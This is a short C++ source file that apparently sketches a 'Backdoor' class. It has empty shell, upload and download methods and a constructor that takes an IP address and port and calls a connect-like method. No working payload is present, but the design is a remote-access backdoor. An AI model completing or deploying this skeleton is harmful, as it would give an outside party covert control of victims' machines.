#include "backdoor.h"

void Backdoor::shell(){
    


}


void Backdoor::upload(){
    


}


void Backdoor::download(){
    


}


Backdoor::Backdoor(char *ip, int port){
    this->ip = ip;
    this->port = port;
    this->c(ip, port);
}

